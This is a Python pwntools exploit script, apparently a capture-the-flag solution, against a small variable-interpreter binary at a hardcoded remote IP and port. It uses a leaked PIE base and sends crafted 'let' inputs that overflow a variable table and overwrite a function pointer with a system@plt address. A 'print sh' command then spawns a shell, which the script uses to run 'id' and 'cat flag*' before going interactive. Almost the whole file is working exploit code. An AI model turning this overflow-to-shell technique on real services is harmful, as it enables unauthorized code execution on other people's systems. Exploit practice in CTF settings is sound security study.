#!/usr/bin/env python3
from pwn import *
import struct, time

context.arch = 'amd64'

HOST = "212.2.248.184"
PORT = 32745
BINARY = "./main_ltbov0N"

def exploit(r):
    r.recvuntil(b"session started at: ")
    leak = int(r.recvline().strip(), 16)
    log.info(f"PIE base: {hex(leak)}")

    system_wrapper = leak + 0x12c0  # jmp system@plt at PIE+0x12c0

    # Variable table at PIE+0x40a0, 20-byte entries, counter at PIE+0x4140
    # Function pointer at PIE+0x4150 (jmp [ptr] when "print" var not found)
    # Each "let" copies 64 bytes from input[4:68] then writes 4-byte value
    # No bounds check -> overflow table into counter + function pointer
    # Entries 5,6,7 overwrite counter; entry 7's copy covers 0x4150

    # Entries 0-4: normal (don't reach counter at 0x4140)
    for i in range(5):
        r.sendline(f"let var{i:04d} = {i}".encode())

    # Entry 5 (idx=5): counter at input byte 64 -> preserve as 5
    p5 = bytearray(68)
    p5[0:4] = b"let "
    p5[4:30] = b"e" * 26
    p5[30:34] = b" = 5"
    p5[64:68] = struct.pack("<I", 5)
    r.sendline(bytes(p5))

    # Entry 6 (idx=6): counter at input byte 44 -> preserve as 6
    p6 = bytearray(48)
    p6[0:4] = b"let "
    p6[4:30] = b"f" * 26
    p6[30:34] = b" = 6"
    p6[44:48] = struct.pack("<I", 6)
    r.sendline(bytes(p6))

    # Entry 7 (idx=7): counter at byte 24, func ptr at byte 40
    p7 = bytearray(48)
    p7[0:4] = b"let "
    p7[4:20] = b"g" * 16
    p7[20:24] = b" = 7"
    p7[24:28] = struct.pack("<I", 7)   # preserve counter = 7
    p7[40:48] = struct.pack("<Q", system_wrapper)  # overwrite func ptr
    r.sendline(bytes(p7))

    # Trigger: print nonexistent var -> jmp [func_ptr] = system(rdi="/bin/sh")
    # Using "sh" instead of "/bin/sh" to avoid path issues
    time.sleep(0.1)
    r.sendline(b"print sh")
    time.sleep(0.2)

    r.sendline(b"id")
    log.info(r.recvline(timeout=3).decode().strip())

    r.sendline(b"cat flag*")
    log.info(r.recvline(timeout=3).decode().strip())

    r.interactive()

if __name__ == "__main__":
    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process(BINARY)
    exploit(r)
